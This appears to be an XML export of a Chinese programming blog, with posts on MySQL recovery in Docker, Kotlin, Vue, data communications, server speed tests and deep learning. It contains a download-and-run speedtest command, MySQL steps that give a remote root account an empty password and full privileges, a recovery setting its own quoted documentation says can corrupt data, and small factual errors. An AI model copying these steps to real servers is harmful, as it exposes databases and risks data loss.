<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 进入mysql数据库</span><br><span class="line">use mysql; </span><br><span class="line"># 查看用户信息</span><br><span class="line"><span class="keyword">select</span> host, <span class="keyword">user</span>, authentication_string, plugin <span class="keyword">from</span> <span class="keyword">user</span>; </span><br><span class="line"># 修改密码</span><br><span class="line"><span class="keyword">update</span> <span class="keyword">user</span> <span class="keyword">set</span> authentication_string<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>按<code>ctrl+d</code>退出mysql,再按一次退出docker<br>然后我们退出docker服务,重新启动mysql(不进入安全模式)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> -f 102 <span class="comment"># 删除容器</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新启动,并且不适用安全模式</span></span><br><span class="line"> docker run -p 3306:3306 --name 102 \</span><br><span class="line">    -v /root/back/102/mysql-files:/var/lib/mysql-files \</span><br><span class="line">    -v /root/back/102/conf:/etc/mysql \</span><br><span class="line">    -v /root/back/102/logs:/var/log/mysql \</span><br><span class="line">    -v /root/back/102/data:/var/lib/mysql \</span><br><span class="line">    -e MYSQL_ROOT_PASSWORD=yourpassword \</span><br><span class="line">    -d mysql:8.0.19 </span><br><span class="line"></span><br><span class="line"><span class="comment"># 进入docker容器</span></span><br><span class="line">docker <span class="built_in">exec</span> -it 102 bash</span><br><span class="line"><span class="comment"># 进入mysql</span></span><br><span class="line">mysql -u root </span><br><span class="line"><span class="comment"># 可能需要的步骤(有时候,如果被提示root用户没有权限就执行这个命令)</span></span><br><span class="line"><span class="comment"># grant system_user on *.* to &#x27;root&#x27;@&#x27;localhost&#x27;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加root@%用户</span></span><br><span class="line">CREATE USER <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED BY <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 为root设置允许所有权限</span></span><br><span class="line">GRANT ALL ON *.* TO <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置加密方式</span></span><br><span class="line">ALTER USER <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;%&#x27;</span> IDENTIFIED WITH mysql_native_password BY <span class="string">&#x27;yourpassword&#x27;</span>;</span><br><span class="line">ALTER USER <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED WITH mysql_native_password BY <span class="string">&#x27;yourpassword&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 刷新权限</span></span><br><span class="line">flush privileges;</span><br></pre></td></tr></table></figure>

<p>至此我们就完成了数据库的恢复工作.<br>如果是在云服务器,我们就需要放开3306端口,本地就直接连接即可.<br>这样子我们就可以通过navicat等工具连接到数据库了.</p>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>在经过长达3-4个月的实际使用中。经常会经历包括服务器奔溃，数据库奔溃的情况。曾经我不会解决，每次都要花个10到20分钟。从0开始重新部署一遍数据库。总会显得有些麻烦。现在有一个解决方案：<br><a href="https://dev.mysql.com/doc/refman/8.0/en/forcing-innodb-recovery.html">mysql8.0参考文档</a></p>
<p>在这个文档中，解释到了一些关于强制重启的参数。而这正是我所刚需的。我并不需要对数据库进行写服务，只需要把他设置为readonly模式。这样子，就算服务器因为内存太小奔溃了。它也可以重新自启动。</p>
<p>解决措施：在<code>my.cnf</code>中设置如下参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">innodb_force_recovery = 1</span><br></pre></td></tr></table></figure>

<p>1 （SRV_FORCE_IGNORE_CORRUPT）</p>
<p>即使检测到损坏的页面， 也让服务器运行 。尝试 跳过损坏的索引记录和页面，这有助于转储表。 SELECT * FROM tbl_name</p>
<p>2 （SRV_FORCE_NO_BACKGROUND）</p>
<p>阻止主线程和任何清除线程运行。如果在清除操作期间发生意外退出，此恢复值将阻止它。</p>
<p>3 （SRV_FORCE_NO_TRX_UNDO）</p>
<p>崩溃恢复后 不运行事务 回滚。</p>
<p>4 （SRV_FORCE_NO_IBUF_MERGE）</p>
<p>防止插入缓冲区合并操作。如果这些操作会导致崩溃，则不执行这些操作。不计算表统计 信息。此值可能会永久损坏数据文件。使用此值后，请准备删除并重新创建所有二级索引。设置 InnoDB为只读。</p>
<p>5 （SRV_FORCE_NO_UNDO_LOG_SCAN）</p>
<p>启动数据库时 不查看撤消日志InnoDB：即使未完成的事务也视为已提交。此值可能会永久损坏数据文件。设置InnoDB为只读。</p>
<p>6 （SRV_FORCE_NO_LOG_REDO）</p>
<p>不执行与恢复相关的重做日志 前滚。此值可能会永久损坏数据文件。使数据库页面处于过时状态，这反过来可能会导致 B 树和其他数据库结构进一步损坏。设置 InnoDB为只读。</p>
<p>一般设置为4以上时，就可以解决我的需要了。<br>以上</p>
]]></content>
      <tags>
        <tag>mysql</tag>
        <tag>备份恢复</tag>
      </tags>
  </entry>
  <entry>
    <title>数据类、密封类和枚举类</title>
    <url>/posts/ff4fa478/</url>
    <content><![CDATA[<h2 id="数据类"><a href="#数据类" class="headerlink" title="数据类"></a>数据类</h2><p>在class前面加上data前缀，将会创建一个数据类。<br>编译器会自动的从主构造函数中根据所有声明的属性提取以下函数：</p>
<p>equals() &#x2F; hashCode()<br>toString() 格式如 “User(name&#x3D;John, age&#x3D;42)”<br>componentN() functions 对应于属性，按声明顺序排列<br>copy() 函数</p>
<p>copy函数示例：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">data</span> <span class="keyword">class</span> <span class="title class_">User</span>(<span class="keyword">val</span> name: String, <span class="keyword">val</span> age: <span class="built_in">Int</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span> &#123;</span><br><span class="line">    <span class="keyword">val</span> jack = User(name = <span class="string">&quot;Jack&quot;</span>, age = <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">val</span> olderJack = jack.copy(age = <span class="number">2</span>)</span><br><span class="line">    println(jack)</span><br><span class="line">    println(olderJack)</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="密封类"><a href="#密封类" class="headerlink" title="密封类"></a>密封类</h2><p>密封类用来表示受限的类继承结构。<br>每个枚举常量只存在一个实例，而密封类 的一个子类可以有可包含状态的多个实例</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">sealed</span> <span class="keyword">class</span> <span class="title class_">Expr</span></span><br><span class="line"><span class="keyword">data</span> <span class="keyword">class</span> <span class="title class_">Const</span>(<span class="keyword">val</span> number: <span class="built_in">Double</span>) : Expr()</span><br><span class="line"><span class="keyword">data</span> <span class="keyword">class</span> <span class="title class_">Sum</span>(<span class="keyword">val</span> e1: Expr, <span class="keyword">val</span> e2: Expr) : Expr()</span><br><span class="line"><span class="keyword">object</span> NotANumber : Expr()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">eval</span><span class="params">(expr: <span class="type">Expr</span>)</span></span>: <span class="built_in">Double</span> = <span class="keyword">when</span> (expr) &#123;</span><br><span class="line">    <span class="keyword">is</span> Const -&gt; expr.number</span><br><span class="line">    <span class="keyword">is</span> Sum -&gt; eval(expr.e1) + eval(expr.e2)</span><br><span class="line">    NotANumber -&gt; <span class="built_in">Double</span>.NaN</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>他的子类都会被作为内嵌类的属性使用。他一般都配合when使用。</p>
<h2 id="枚举类"><a href="#枚举类" class="headerlink" title="枚举类"></a>枚举类</h2><p>实现一个类型安全的枚举。其中每个常量用逗号分隔，每个美剧常量都是一个对象。</p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>数据类型、位操作、字符、数组、字符串</title>
    <url>/posts/2cfb3701/</url>
    <content><![CDATA[<h2 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h2><p>类型     -&gt;  位宽度<br>Double  -&gt;  64<br>Float     -&gt;  32<br>Long     -&gt;  64<br>Int        -&gt;  32<br>Short    -&gt;    16<br>Byte    -&gt;    8</p>
<h3 id="kotlin不支持8进制"><a href="#kotlin不支持8进制" class="headerlink" title="kotlin不支持8进制"></a>kotlin不支持8进制</h3><p>有10进制：<br>2进制：0b开头<br>16进制：0x开头<br>且他的数据类型不会自动由精度低的向高精度的自动转型。必须严格限制类型。</p>
<h2 id="位操作符"><a href="#位操作符" class="headerlink" title="位操作符"></a>位操作符</h2><p>对于Int和Long类型，还有一系列的位操作符可以使用，分别是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shl(bits) – 左移位 (Java’s &lt;&lt;)</span><br><span class="line">shr(bits) – 右移位 (Java’s &gt;&gt;)</span><br><span class="line">ushr(bits) – 无符号右移位 (Java’s &gt;&gt;&gt;)</span><br><span class="line">and(bits) – 与</span><br><span class="line">or(bits) – 或</span><br><span class="line">xor(bits) – 异或</span><br><span class="line">inv() – 反向</span><br></pre></td></tr></table></figure>
<h2 id="字符"><a href="#字符" class="headerlink" title="字符"></a>字符</h2><p>kotlin中的字符不能直接和数字比较，也就是不能直接转化为ASCII码。除非显式转化为Int类型  </p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;c&#x27;</span>.toInt()<span class="comment">//已废除</span></span><br><span class="line"><span class="string">&#x27;c&#x27;</span>.code<span class="comment">//表示&#x27;c&#x27;的ASCII码</span></span><br></pre></td></tr></table></figure>
<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>数组用类 Array 实现，并且还有一个 size 属性及 get 和 set 方法，由于使用 [] 重载了 get 和 set 方法，所以我们可以通过下标很方便的获取或者设置数组对应位置的值。</p>
<p>数组的创建两种方式：一种是使用函数arrayOf()；另外一种是使用工厂函数。如下所示，我们分别是两种方式创建了两个数组：</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">(args: <span class="type">Array</span>&lt;<span class="type">String</span>&gt;)</span></span> &#123;</span><br><span class="line">    <span class="comment">//[1,2,3]</span></span><br><span class="line">    <span class="keyword">val</span> a = arrayOf(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br><span class="line">    <span class="comment">//[0,2,4]</span></span><br><span class="line">    <span class="keyword">val</span> b = Array(<span class="number">3</span>, &#123; i -&gt; (i * <span class="number">2</span>) &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment">//读取数组内容</span></span><br><span class="line">    println(a[<span class="number">0</span>])    <span class="comment">// 输出结果：1</span></span><br><span class="line">    println(b[<span class="number">1</span>])    <span class="comment">// 输出结果：2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>若要读取一整个数组需要使用数组的一个方法<code>.contentToString()</code>才可以让数组不显示hash值。正确显示。</p>
<h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><p>一个去除前置空格的方法<code>trimMargin()</code>字符串可以调用该方法去除掉前置空格。</p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>新公告</title>
    <url>/posts/9493ce59/</url>
    <content><![CDATA[<p>大家好，这个博客更新至今已有将近2年了，期间从<code>memos</code>切换到<code>typecho</code>。最后迁移到<code>hexo</code>做为最终的博客平台。而在之后，或许这个博客将会大大降低更新频率了。</p>
<p>一是因为最近上手了新的笔记平台<code>Obsidian</code>,再搭配上一些其他的云存储工具。他已经可以在很大程度上胜任我对知识记录的需求。所以往后我可能少再博客上更新了。而是直接记录在我的个人笔记上。<br>其次，接下来也即将步入社会，要面临工作了，或许也不会有太充足的时间让我广而学之然后更新博客内容。</p>
<p>当然再此之后，我肯定也会更新，只是内容会更加精炼，尽量做到每一次的内容都更加有价值😘😘😘</p>
<p><text style="color: red;font-weight: bold; font-size: 20px; text-align: center; display: block; margin-top: 20px; margin-bottom: 20px; padding: 10px; background-color: #f0f0f0; border: 1px solid #ccc; border-radius: 5px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);"><strong>以上</strong></text></p>
]]></content>
  </entry>
  <entry>
    <title>数据通信基础：传输数据的信息系统</title>
    <url>/posts/870f1c14/</url>
    <content><![CDATA[<h2 id="数据通信基础"><a href="#数据通信基础" class="headerlink" title="数据通信基础"></a>数据通信基础</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><ul>
<li>消息</li>
<li>信息 <strong>（有用的消息）</strong></li>
<li>数据</li>
<li>信号 信息的物理表现 主要为电信号</li>
</ul>
<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>（依照<em><strong>通信协议</strong></em> ，利用数据传输技术在两个功能单元之间传递数据信息，它可实现<em><strong>计算机与计算机、计算机与终端或终端与终端之间</strong></em>的数据信息传递） </p>
<h4 id="数据信号基本传输方式"><a href="#数据信号基本传输方式" class="headerlink" title="数据信号基本传输方式"></a>数据信号基本传输方式</h4><p>  基带传输（直接传输数字信号），频带传输（信道上实际传输的是模拟信号）和数字传输（PCM信道）。</p>
<p>  模拟信号：频带传输。 数字信号：基带传输和数字传输</p>
<h4 id="传输代码"><a href="#传输代码" class="headerlink" title="传输代码"></a>传输代码</h4><p>   国际五号码，IA5，ASCII码</p>
<blockquote>
<p>语音的数据编码<br>A&#x2F;D转化要经过:采样、量化、编码。<br>采样速度: fs&gt;2fm （采样定理）。<br>fm为语音信号的最高频率，一般为4 kHz.<br>采用A律特性的PCM调制，每个量化值用8位二进制数表示，因此一路数字话音速率为64 kbps.<br>条形码<br>条形码是在商店里几乎在每件商品上都可以看到的那些万能的黑白条状粘贴物。条形码是一系列由白色间隔分隔的&gt; &gt; 黑条。黑条的宽度以及它们的反光能力代表二进制的“1”和“0”，用来识别商品的价格或物品。</p>
</blockquote>
<h2 id="数据通信系统"><a href="#数据通信系统" class="headerlink" title="数据通信系统"></a>数据通信系统</h2><pre><code>![image](./o/r/15/2a9f95b6-c306-45a2-96e7-1422c5fe3d25/1681712430_image.png)
  模拟通信系统，利用模拟信号传输，需要经过模拟信号和原始电信号(基带信号)的转变，基带信号和频带信号
数字通信模型
![image](./o/r/18/b31623f5-daff-4c77-8d87-def1c155fd42/1681713207_image.png)
</code></pre>
<ul>
<li>信源编码与译码目的：提高信息传输的有效性;完成模&#x2F;数转换。</li>
<li>信道编码与译码目的：增强抗干扰能力。</li>
<li>加密与解密目的：保证所传信息的安全。</li>
<li>数字调制与解调目的：形成适合在信道中传输的带通信号。 </li>
<li>同步目的：使收发两端的信号在时间上保持步调一致。<br><img src="/./o/r/19/c1cca1c3-bd6e-4d50-98dd-381b699f8584/1681713938_image.png" alt="image"></li>
</ul>
<h3 id="数据终端设备（DTE）将信息变化为数据：数据输入设备，数据输出设备，传输控制器。"><a href="#数据终端设备（DTE）将信息变化为数据：数据输入设备，数据输出设备，传输控制器。" class="headerlink" title="数据终端设备（DTE）将信息变化为数据：数据输入设备，数据输出设备，传输控制器。"></a>数据终端设备（DTE）将信息变化为数据：数据输入设备，数据输出设备，传输控制器。</h3><h2 id="传输控制器控制数据的传输过程"><a href="#传输控制器控制数据的传输过程" class="headerlink" title="传输控制器控制数据的传输过程"></a>传输控制器控制数据的传输过程</h2><h3 id="数据电路：数据电路端接设备（DCE）和-传输路线-！并不是说，数据通信一定是数字信号，也可以有模拟信号的传输。"><a href="#数据电路：数据电路端接设备（DCE）和-传输路线-！并不是说，数据通信一定是数字信号，也可以有模拟信号的传输。" class="headerlink" title="数据电路：数据电路端接设备（DCE）和 传输路线 ！并不是说，数据通信一定是数字信号，也可以有模拟信号的传输。"></a>数据电路：数据电路端接设备（DCE）和 传输路线 ！并不是说，数据通信一定是数字信号，也可以有模拟信号的传输。</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">基带传输时，DCE对DTE的数据信号进行变换，使信号功率谱与信道相适应，使得数据信号适合在电缆信道中传输。</span><br><span class="line">频带信号传输时，DCE具体是调制解调器，实现用基带信号调制载波信号，实现频带搬移。 </span><br><span class="line">数据信号在数字信道上传输时，即数字数据传输，DCE是数据服务单元，即信号格式变换，消除信号中的直流成分和防止长串1或长串0编码，信号再生和定时等。</span><br><span class="line">数据电路加上数据传输控制功能、通信控制功能后就构成了数据链路。</span><br><span class="line">控制装置是按照双方事先约定的规程进行控制的。</span><br></pre></td></tr></table></figure>

<h3 id="中央计算机系统-CCS"><a href="#中央计算机系统-CCS" class="headerlink" title="中央计算机系统(CCS)"></a>中央计算机系统(CCS)</h3><p>组成：由通信控制器、主机及其外围设备组成；<br>功能：处理从DTE输入的数据信息，并将处理结果向相应的DTE输出。<br>通信控制器：是数据电路和计算机系统的接口。<br>通信控制器又称为前置处理机，用于管理与数据终端相连接的所有通信线路；<br>完成信号的串并转换。（对DTE来说其功能是差错控制和传输过程控制等）。<br>主机：又称为中央处理机，由中央处理单元（CPU）、主存储器、输入&#x2F;输出设备及其他外围设备组成。<br>其功能主要是进行<em><strong>数据处理</strong></em>。</p>
<h3 id="传输信道"><a href="#传输信道" class="headerlink" title="传输信道"></a>传输信道</h3><p>狭义：传输介质<br>广义：传输介质和各种信号之间的转化。<br>分类：</p>
<p>1. </p>
<ul>
<li>有线信道</li>
<li>无线信道（电磁波）</li>
</ul>
<ol start="2">
<li></li>
</ol>
<ul>
<li>数字信道<ul>
<li>模拟信道</li>
</ul>
</li>
</ul>
<p>3. </p>
<ul>
<li>专用信道<ul>
<li>公用信道<br>介质特性：物理特性，传输特性，干扰特性。<br>卫星通信（270ms时延）</li>
</ul>
</li>
</ul>
<h3 id="传输损耗"><a href="#传输损耗" class="headerlink" title="传输损耗"></a>传输损耗</h3><p>衰减(信噪比低)，延迟(产生信号畸变)，噪声(破坏信号，产生误码，0.01s560比特)</p>
<ul>
<li>光纤损耗最小点在1.31和1.55m</li>
</ul>
<ol>
<li>衰减<br>  传输的过程中转化为热能，导致信号强度不断减弱。D&#x3D;10lgP0&#x2F;P1（信噪比）介质的输入功率和输出功率之差。</li>
<li>噪声和干扰<br>  分子热运动，高斯白噪声，无法预测。<br>幅度的概率密度服从高斯分布；<br>功率谱密度(单位W&#x2F;Hz)N0在整个频率域内均匀分布。<br>噪声功率&#x3D;带宽*功率谱密度 PN &#x3D; BN0<br><em><strong>信号功率与噪声功率之比</strong></em>:<br><img src="/./o/r/20/e74488ad-51eb-4b37-8e33-00885d229cb4/1681719896_image.png" alt="image"><br><img src="/./o/r/21/0912745d-9665-4e72-9e22-35f8ab41a878/1681719944_image.png" alt="image"></li>
</ol>
]]></content>
      <tags>
        <tag>数据通信</tag>
      </tags>
  </entry>
  <entry>
    <title>服务器测速</title>
    <url>/posts/3948588c/</url>
    <content><![CDATA[<ol>
<li><p>SSH连接登录云服务器</p>
</li>
<li><p>执行命令：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://raw.github.com/sivel/speedtest-cli/master/speedtest.py</span><br><span class="line">python speedtest.py --share</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后就会有所需要的测速图片地址了<br><img src="https://image.zfxt.top/hexo-blog/%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B5%8B%E9%80%9F-2024-02-13-28-48.jpg"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>Linux基础</category>
      </categories>
      <tags>
        <tag>speedtest</tag>
      </tags>
  </entry>
  <entry>
    <title>本地存储带动态路径</title>
    <url>/posts/3c0d3cf9/</url>
    <content><![CDATA[<blockquote>
<p><a href="https://usememos.com/docs/local-storage">官方文档</a><br>主要使用local的本地存储，可以使用动态存储路径。<br>例如<code>assets/&#123;year&#125;/&#123;month&#125;/&#123;day&#125;/&#123;timestamp&#125;_&#123;filename&#125;</code>会转变为<br><code>./assets/2020/01/01/1577808000_your-file-name.jpg</code></p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>浏览器解析JSON数据受响应头影响</title>
    <url>/posts/4b71b454/</url>
    <content><![CDATA[<p>已知，很多浏览器会默认去解析从api获取到的json格式的数据。但是却无法解析成功。<br>这是因为浏览器解析这个数据是需要判断返回值的headers的。<br>例如：当我向后端发送请求时，如果response的header为Content-Type:text&#x2F;plain。<br>那么该浏览器便不会对他进行解析，而是默认为字符串。<br>此时后端程序为</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">get</span>(<span class="string">&quot;/api/sentence&quot;</span>)&#123;</span><br><span class="line"><span class="comment">//            call.response.headers.append(&quot;Content-Type&quot;, &quot;application/json&quot;)</span></span><br><span class="line">            <span class="keyword">val</span> number = (<span class="number">0.</span><span class="number">.1000</span>).random()</span><br><span class="line">            call.respond(JSONUtil.toJsonStr(readText?.<span class="keyword">get</span>(number)))</span><br><span class="line"></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>前端查看到的数据为<br><img src="http://118.89.85.47:5230/o/r/51/6d82dc39-8ebb-4fe8-a3f0-3f2ef2be5eb1/image.png" alt="image"><br>此时的响应头为<br><img src="http://118.89.85.47:5230/o/r/52/81e6fcf1-45d9-4c82-8adc-2547f6accfb7/image.png" alt="image"><br>此时如果需要浏览器可以解析数据。只需要将上述代码的<code>//</code>去除，然后他返回的标头便会变为application&#x2F;json。然后即可解析为下图<br><img src="http://118.89.85.47:5230/o/r/53/eec3cc4a-25e0-49ba-b873-00e04167c105/image.png" alt="image"><br>响应头为<br><img src="http://118.89.85.47:5230/o/r/54/5d2e19de-7f3e-4e1e-8182-7f5a54b60d77/image.png" alt="image"></p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
      <tags>
        <tag>json</tag>
      </tags>
  </entry>
  <entry>
    <title>海外节点更新域名配置耗时</title>
    <url>/posts/9faca216/</url>
    <content><![CDATA[<p>域名未备案，只能使用海外节点，所以每次更新域名配置时，都要花费很长的时间才能完成。 </p>
]]></content>
  </entry>
  <entry>
    <title>浏览器路由导航：Push vs Replace</title>
    <url>/posts/f2612c99/</url>
    <content><![CDATA[<h1 id="路由2"><a href="#路由2" class="headerlink" title="路由2"></a>路由2</h1><p>浏览器历史记录有两种方式<br>push：不会删去刚刚的页面，而是添加新的页面记录，像压栈一样去记录<br>replace：直接替换掉刚刚的页面记录。<br>浏览器默认为push操作<br>再router-link中添加一个属性<code>:replace=&quot;true&quot;</code>他会将改点击事件记录为replace操作</p>
<h1 id="编程式路由导航"><a href="#编程式路由导航" class="headerlink" title="编程式路由导航"></a>编程式路由导航</h1><p>即不通过router-link即不适用a标签。而是通过写方法于button绑定之类的方法。<br>关键方法：<code>this.$router.push(&#123;&#125;)</code>这里通过实现router的push方法跳转页面，也可以使用replace方法进行跳转。同样的push中的对象就是to的对象时写法。有name，path，params，query参数。</p>
<h3 id="两种方法。"><a href="#两种方法。" class="headerlink" title="两种方法。"></a>两种方法。</h3><p>$router.back()后退页面，￥router.forword()页面前进</p>
]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>消息订阅发布和Vue.set使用</title>
    <url>/posts/99055447/</url>
    <content><![CDATA[<h2 id="pubsub"><a href="#pubsub" class="headerlink" title="pubsub"></a>pubsub</h2><p>实现消息订阅于发布<br>先安装pubsub</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">npm i pubsub-js</span><br></pre></td></tr></table></figure>
<p>可以实现消息订阅与发布，他的操作主要有<code>subscribe</code>订阅，<code>unsubscribe</code>取消订阅，<code>publish</code>发布消息。<em><strong>每次取消订阅需要获取订阅的id再用案例订阅</strong></em>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//学校</span><br><span class="line">&lt;script&gt;</span><br><span class="line">import pubsub from &#x27;pubsub-js&#x27;;</span><br><span class="line">	export default(&#123;</span><br><span class="line">		name:&#x27;school&#x27;,</span><br><span class="line">		data()&#123;</span><br><span class="line">			return&#123;</span><br><span class="line">				schoolName:&#x27;湖科大&#x27;,</span><br><span class="line">				addr:&#x27;湖南&#x27;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;,</span><br><span class="line">		mounted()&#123;</span><br><span class="line">		const pubid = 	pubsub.subscribe(&#x27;hello&#x27;,function(messageName,data)&#123;</span><br><span class="line">				console.log(&#x27;成功订阅消息&#x27;,messageName,data)</span><br><span class="line">			&#125;)</span><br><span class="line">		&#125;,</span><br><span class="line">		beforeDestroy()&#123;</span><br><span class="line">			pubsub.unsubscribe(pubid)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;)</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">//学生</span><br><span class="line">&lt;script&gt;</span><br><span class="line">import pubsub from &#x27;pubsub-js&#x27;;</span><br><span class="line">    export default  &#123;</span><br><span class="line">        name:&#x27;Student&#x27;,</span><br><span class="line">        data()&#123;</span><br><span class="line">            return&#123;</span><br><span class="line">                name:&#x27;hzt&#x27;,</span><br><span class="line">                sex:&#x27;男&#x27;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        mounted()&#123;</span><br><span class="line"></span><br><span class="line">        &#125;,</span><br><span class="line">        methods:&#123;</span><br><span class="line">            sendStudentName()&#123;</span><br><span class="line">                pubsub.publish(&#x27;hello&#x27;,666)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h2 id="Vue-set的使用"><a href="#Vue-set的使用" class="headerlink" title="Vue.set的使用"></a>Vue.set的使用</h2><p>例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">handleEdit(todo)&#123;</span><br><span class="line">  this.$set(todo,&#x27;isEdit&#x27;,true)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>他的作用是给todo数组添加一个属性<code>isEdit</code>且值为<code>true</code>，这个属性会接受数据代理，能够被vue所检测到。</p>
]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>深度学习再入门</title>
    <url>/posts/505d5ee7/</url>
    <content><![CDATA[<h2 id="什么是深度学习"><a href="#什么是深度学习" class="headerlink" title="什么是深度学习"></a>什么是深度学习</h2><p>深度学习是一种人工智能（AI）方法，用于教计算机以受人脑启发的方式处理数据。深度学习模型可以识别图片、文本、声音和其他数据中的复杂模式，从而生成准确的见解和预测。</p>
<h3 id="深度学习的广义作用"><a href="#深度学习的广义作用" class="headerlink" title="深度学习的广义作用"></a>深度学习的广义作用</h3><p><strong>计算机视觉</strong><br>计算机视觉是指计算机从图像和视频中提取信息及见解的能力。计算机可以使用深度学习技术来理解图像，就像人类一样。计算机视觉具有多种应用，如下所示：</p>
<ul>
<li>内容审核，用于从图像和视频归档中自动删除不安全或不适当的内容</li>
<li>面部识别，用于识别面部和多项属性，如睁开的眼睛、眼镜以及面部毛发</li>
<li>图像分类，用于识别品牌徽标、服装、安全装备和其他图像细节</li>
</ul>
<p><strong>语音识别</strong><br>深度学习模型可以分析人类语音，尽管说话模式、音调、语气、语言和口音不尽相同。虚拟助手（如 Amazon Alexa）和自动转录软件使用语音识别执行以下任务：</p>
<p><strong>自然语言处理</strong><br>计算机使用深度学习算法从文本数据和文档中收集见解和意义。这种处理自然的、人工创建的文本的能力有几个使用场景，包括在以下功能中：<br><strong>推荐引擎</strong><br>应用程序可以使用深度学习方法来跟踪用户活动并开发个性化推荐。它们可以分析各种用户的行为，并帮助他们发现新产品或服务。例如，许多媒体和娱乐公司，例如 Netflix、Fox 和 Peacock，都使用深度学习来提供个性化的视频推荐。</p>
<h3 id="深度学习的工作原理"><a href="#深度学习的工作原理" class="headerlink" title="深度学习的工作原理"></a>深度学习的工作原理</h3><p>深度学习算法是仿照人脑建模的神经网络。例如，人脑包含数百万个相互关联的神经元，它们协同工作以学习和处理信息。同样，深度学习神经网络（或人工神经网络）是由在计算机内部协同工作的多层人工神经元组成的。<br><img src="https://image.zfxt.top/hexo-blog/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E5%86%8D%E5%85%A5%E9%97%A8-2024-04-26-19-20-45.png" alt="深度学习再入门-2024-04-26-19-20-45"><br>人工神经元是称为节点的软件模块，它使用数学计算来处理数据。人工神经网络是使用这些节点来解决复杂问题的深度学习算法。</p>
<h3 id="深度学习的组成部分"><a href="#深度学习的组成部分" class="headerlink" title="深度学习的组成部分"></a>深度学习的组成部分</h3><p><strong>输入层</strong><br>人工神经网络有几个向其输入数据的节点。这些节点构成了系统的输入层。</p>
<p><strong>隐藏层</strong><br>输入层处理数据并将其传递到神经网络中更远的层。这些隐藏层在不同层级处理信息，在接收新信息时调整其行为。深度学习网络有数百个隐藏层，可用于从多个不同角度分析问题。</p>
<p>例如，如果您得到了一张必须分类的未知动物的图像，则可以将其与您已经认识的动物进行比较。例如，您可以查看其眼睛和耳朵的形状、大小、腿的数量和毛皮花色。您可以尝试识别图样，如下所示：</p>
<ul>
<li>动物有蹄，所以它可能是牛或鹿。</li>
<li>动物有猫眼，所以它可能是某种类型的野猫。</li>
</ul>
<p>深度神经网络中的隐藏层以相同的方式工作。如果深度学习算法试图对动物图像进行分类，则其每个隐藏层都会处理动物的不同特征并尝试对其进行准确的分类。</p>
